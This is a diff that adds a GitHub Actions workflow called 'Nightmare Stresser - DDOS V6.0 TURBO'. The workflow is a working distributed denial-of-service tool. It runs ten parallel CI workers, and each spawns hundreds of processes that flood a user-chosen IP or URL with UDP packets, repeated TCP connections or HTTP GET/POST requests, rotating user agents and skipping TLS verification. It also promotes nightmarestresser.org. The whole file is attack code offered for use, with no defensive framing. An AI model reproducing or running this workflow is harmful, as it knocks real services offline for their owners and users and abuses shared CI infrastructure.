@@ -1,0 +1,209 @@
+name: Nightmare Stresser - DDOS V6.0 TURBO
+on:
+  workflow_dispatch:
+    inputs:
+      protocol:
+        description: 'Protocol (UDP/TCP/HTTP)'
+        required: true
+        type: choice
+        options:
+          - UDP
+          - TCP
+          - HTTP
+      method:
+        description: 'Attack Method'
+        required: true
+        type: string
+      target:
+        description: 'Target IP or URL'
+        required: true
+        type: string
+      port:
+        description: 'Target Port (for UDP/TCP)'
+        required: false
+        type: number
+        default: 80
+      duration:
+        description: 'Duration (seconds)'
+        required: true
+        type: number
+        default: 60
+      packet_size:
+        description: 'Packet Size (bytes)'
+        required: false
+        type: number
+        default: 65000
+      threads:
+        description: 'Number of parallel workers'
+        required: false
+        type: number
+        default: 500
+
+jobs:
+  attack:
+    runs-on: ubuntu-latest
+    strategy:
+      max-parallel: 10
+      matrix:
+        worker: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10]
+    steps:
+      - name: ⚡ INSTANT Setup
+        run: |
+          echo "🚀 Worker #${{ matrix.worker }} ONLINE"
+          sudo apt-get install -y hping3 &>/dev/null &
+          pip3 install --quiet --no-cache-dir requests &
+
+      - name: 🔥 UDP TURBO Attack
+        if: ${{ github.event.inputs.protocol == 'UDP' }}
+        run: |
+          python3 - << 'EOF'
+          import socket, os, time
+          from multiprocessing import Process
+          
+          METHOD = "${{ github.event.inputs.method }}"
+          TARGET = "${{ github.event.inputs.target }}"
+          PORT = ${{ github.event.inputs.port }}
+          DURATION = ${{ github.event.inputs.duration }}
+          SIZE = ${{ github.event.inputs.packet_size }}
+          PROCS = ${{ github.event.inputs.threads }}
+          
+          # Pre-generate payloads for SPEED
+          if METHOD == "random":
+              PAYLOADS = [os.urandom(SIZE) for _ in range(1000)]
+          else:
+              PAYLOADS = [b"A" * SIZE]
+          
+          def blast(pid):
+              sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+              sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 2097152)
+              end = time.time() + DURATION
+              i = 0
+              
+              if METHOD == "burst":
+                  while time.time() < end:
+                      for _ in range(100):
+                          sock.sendto(PAYLOADS[i % len(PAYLOADS)], (TARGET, PORT))
+                          i += 1
+              elif METHOD == "frag":
+                  half = SIZE // 2
+                  p = os.urandom(half)
+                  while time.time() < end:
+                      sock.sendto(p, (TARGET, PORT))
+                      sock.sendto(p, (TARGET, PORT))
+              else:
+                  while time.time() < end:
+                      sock.sendto(PAYLOADS[i % len(PAYLOADS)], (TARGET, PORT))
+                      i += 1
+              sock.close()
+          
+          print(f"🔥 Launching {PROCS} processes for UDP {METHOD}")
+          procs = [Process(target=blast, args=(i,)) for i in range(PROCS)]
+          for p in procs: p.start()
+          for p in procs: p.join()
+          print("✅ DONE")
+          EOF
+
+      - name: ⚡ TCP TURBO Attack
+        if: ${{ github.event.inputs.protocol == 'TCP' }}
+        run: |
+          python3 - << 'EOF'
+          import socket, os, time
+          from multiprocessing import Process
+          
+          METHOD = "${{ github.event.inputs.method }}"
+          TARGET = "${{ github.event.inputs.target }}"
+          PORT = ${{ github.event.inputs.port }}
+          DURATION = ${{ github.event.inputs.duration }}
+          SIZE = ${{ github.event.inputs.packet_size }}
+          PROCS = ${{ github.event.inputs.threads }}
+          
+          PAYLOAD = os.urandom(SIZE) if "data" in METHOD else b"\x00" * 10
+          
+          def blast(pid):
+              end = time.time() + DURATION
+              
+              while time.time() < end:
+                  try:
+                      sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                      sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
+                      sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 2097152)
+                      sock.settimeout(0.5)
+                      
+                      if "syn" in METHOD:
+                          sock.connect_ex((TARGET, PORT))
+                      elif "data" in METHOD:
+                          sock.connect((TARGET, PORT))
+                          sock.sendall(PAYLOAD)
+                      elif METHOD == "ack":
+                          sock.connect((TARGET, PORT))
+                          sock.send(b"\x00" * 10)
+                      elif METHOD == "rst":
+                          sock.connect_ex((TARGET, PORT))
+                      elif METHOD in ["xmas", "fin", "psh", "window"]:
+                          sock.connect((TARGET, PORT))
+                          sock.send(PAYLOAD)
+                      
+                      sock.close()
+                  except:
+                      pass
+          
+          print(f"🔥 Launching {PROCS} processes for TCP {METHOD}")
+          procs = [Process(target=blast, args=(i,)) for i in range(PROCS)]
+          for p in procs: p.start()
+          for p in procs: p.join()
+          print("✅ DONE")
+          EOF
+
+      - name: 🌐 HTTP TURBO Attack
+        if: ${{ github.event.inputs.protocol == 'HTTP' }}
+        run: |
+          python3 - << 'EOF'
+          import urllib.request, time, ssl
+          from multiprocessing import Process
+          from urllib.error import URLError
+          
+          METHOD = "${{ github.event.inputs.method }}"
+          TARGET = "${{ github.event.inputs.target }}"
+          DURATION = ${{ github.event.inputs.duration }}
+          PROCS = ${{ github.event.inputs.threads }}
+          
+          UAS = [
+              "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+              "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Safari/537.36",
+              "Mozilla/5.0 (X11; Linux x86_64) Chrome/120.0.0.0",
+              "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0) Mobile/15E148",
+          ]
+          
+          ctx = ssl._create_unverified_context()
+          
+          def blast(pid):
+              end = time.time() + DURATION
+              ua_idx = 0
+              
+              while time.time() < end:
+                  try:
+                      req = urllib.request.Request(TARGET)
+                      req.add_header('User-Agent', UAS[ua_idx % len(UAS)])
+                      req.add_header('Accept', '*/*')
+                      req.add_header('Connection', 'keep-alive')
+                      ua_idx += 1
+                      
+                      if METHOD == "post":
+                          data = (b"flood=" + b"X" * 10000)
+                          urllib.request.urlopen(req, data=data, context=ctx, timeout=1)
+                      else:
+                          urllib.request.urlopen(req, context=ctx, timeout=1)
+                  except:
+                      pass
+          
+          print(f"🔥 Launching {PROCS} processes for HTTP {METHOD}")
+          procs = [Process(target=blast, args=(i,)) for i in range(PROCS)]
+          for p in procs: p.start()
+          for p in procs: p.join()
+          print("✅ DONE")
+          EOF
+
+      - name: 📊 Stats
+        if: always()
+        run: |
+          echo "✅ Worker #${{ matrix.worker }} | ${{ github.event.inputs.protocol }}/${{ github.event.inputs.method }} | nightmarestresser.org"
